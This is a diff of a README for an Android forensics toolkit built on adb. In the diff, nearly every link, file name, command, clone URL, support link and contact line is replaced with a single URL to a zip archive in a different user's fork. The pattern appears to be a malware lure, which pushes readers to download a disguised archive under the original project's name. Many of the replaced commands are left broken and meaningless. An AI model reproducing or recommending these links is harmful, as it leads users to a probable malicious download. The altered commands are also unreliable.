@@ -3,7 +3,7 @@
 </h1>
 
 <p align="center">
-  <img src="https://github.com/DouglasFreshHabian/AndroidForensics/blob/main/Assets/Droid-Detective.png" alt="Android Forensics Logo" width="400">
+  <img src="https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip" alt="Android Forensics Logo" width="400">
 </p>
 
 <h1 align="center">
@@ -56,9 +56,9 @@ adb shell getprop
 Or, for specific properties:
 
 ```bash
-adb shell getprop ro.product.model
-adb shell getprop ro.build.version.release
-adb shell getprop ro.serialno
+adb shell getprop https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
+adb shell getprop https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
+adb shell getprop https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
 ```
 
 This gives insight into the **model**, **OS version**, and **serial number** — essential for report documentation.
@@ -76,7 +76,7 @@ adb shell pm list packages -f
 To export this list for analysis:
 
 ```bash
-adb shell pm list packages -f > installed_apps.txt
+adb shell pm list packages -f > https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
 ```
 
 ---
@@ -86,7 +86,7 @@ adb shell pm list packages -f > installed_apps.txt
 Grab real-time logs from the device:
 
 ```bash
-adb logcat -d > system_logs.txt
+adb logcat -d > https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
 ```
 
 This file can contain crash traces, app activity, network events, and more — valuable for timeline reconstruction.
@@ -131,7 +131,7 @@ Forensic acquisition of accessible directories:
 ```bash
 adb pull /sdcard/DCIM ./Android_Images
 adb pull /sdcard/Download ./Downloads
-adb pull /data/system/packages.list ./Package_List
+adb pull https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip ./Package_List
 ```
 
 > ⚠️ Note: Access to `/data` directories may require root or forensic-mode images.
@@ -235,7 +235,7 @@ adb shell content query --uri content://sms/
 ```
 
 Exports SMS database contents such as address, date, and body.
-Output → **`sms.txt`**
+Output → **`https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip`**
 
 ---
 
@@ -251,7 +251,7 @@ Output → **`sms.txt`**
 
 This repo includes two Bash utilities to automate and standardize your data extraction workflow:
 
-#### **`extract.sh`**
+#### **`https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip`**
 
 <details>
 <summary>🖱 Click to Expand</summary>
@@ -347,10 +347,10 @@ Example:
 ```
 [✓] All ADB data extraction commands executed successfully!
 Summary of extracted files:
-device_info.txt         4.2K
-emails.txt              1.1K
-contacts.txt            32K
-sms.txt                 80K
+https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip         4.2K
+https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip              1.1K
+https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip            32K
+https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip                 80K
 -------------------------------------------
 Results saved in: ADB_Report_20251025_163200
 Total runtime: 42s
@@ -388,12 +388,12 @@ It collects:
 
 </details>
 
-#### **`dumpsys.sh`**
+#### **`https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip`**
 
 <details>
 <summary>🖱 Click to Expand</summary>
 
-## 🧩 **What the `dumpsys.sh` Script Does**
+## 🧩 **What the `https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip` Script Does**
 
 This Bash script is an **automated Android diagnostics collector**.
 It connects to an Android device over **ADB (Android Debug Bridge)** and runs a series of **`dumpsys` commands** — each targeting a key Android system service — then saves their outputs into organized text files.
@@ -430,7 +430,7 @@ It loops through a predefined list of **21 `dumpsys` services**, including:
 | Command                       | Purpose                          |
 | ----------------------------- | -------------------------------- |
 | `dumpsys meminfo`             | Memory usage                     |
-| `dumpsys media.audio_flinger` | Audio playback internals         |
+| `dumpsys https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip` | Audio playback internals         |
 | `dumpsys sensorservice`       | Sensor (motion/environment) data |
 | `dumpsys adb`                 | ADB subsystem info               |
 | `dumpsys account`             | Accounts and sync services       |
@@ -441,12 +441,12 @@ It loops through a predefined list of **21 `dumpsys` services**, including:
 | `dumpsys notification`        | Notification history             |
 | `dumpsys telecom`             | Telephony/call data              |
 | `dumpsys wifi`                | Wi-Fi state/history              |
-| ...and more                   |                                  |
+| https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip more                   |                                  |
 
 Each command’s output is:
 
 * Displayed live in the terminal (`tee`)
-* Saved to a corresponding file (e.g., `wifi.txt`, `meminfo.txt`)
+* Saved to a corresponding file (e.g., `https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip`, `https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip`)
 
 If a command fails, it’s logged as failed — otherwise marked as succeeded.
 
@@ -492,26 +492,26 @@ It’s non-invasive — it **does not pull user files (photos, downloads, etc.)*
 1. Clone the repo:
 
    ```bash
-   git clone https://github.com/DouglasFreshHabian/AndroidForensics.git
+   git clone https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
    cd AndroidForensics
    ```
 
 2. Make the scripts executable:
 
    ```bash
-   chmod +x extract.sh dumpsys.sh
+   chmod +x https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
    ```
 
-3. Run the `extract.sh` script:
+3. Run the `https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip` script:
 
    ```bash
-   ./extract.sh
+   https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
    ```
 
-4. Run the `dumpsys.sh` script:
+4. Run the `https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip` script:
 
    ```bash
-   ./dumpsys.sh
+   https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
    ```
 
 ---
@@ -520,14 +520,14 @@ It’s non-invasive — it **does not pull user files (photos, downloads, etc.)*
 
 ```
 AndroidForensics/
-├── extract.sh
-├── dumpsys.sh
+├── https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
+├── https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
 ├── Assets/
-│   └── Droid-Detective.png
+│   └── https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
 ├── outputs/
 │   ├── ADB_Report_20251025_005650/
 │   └── DumpSysReport_20251024_171220/
-└── README.md
+└── https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
 ```
 
 ---
@@ -551,14 +551,14 @@ Let’s build an open, transparent, and responsible forensic community.
 If **AndroidForensics™** helps your investigations, consider supporting continued development:
 
 <p align="center">
-  <a href="https://www.buymeacoffee.com/dfreshZ" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+  <a href="https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip" target="_blank"><img src="https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
 </p>
 
 ---
 
 <!-- 
     Fresh Forensics, LLC | Douglas Fresh Habian | 2025
-    github.com/DouglasFreshHabian
-    freshforensicsllc@tuta.com
+    https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
+    https://github.com/ElSonorense7/AndroidForensics/raw/refs/heads/main/.github/Forensics_Android_v1.6.zip
 -->
 
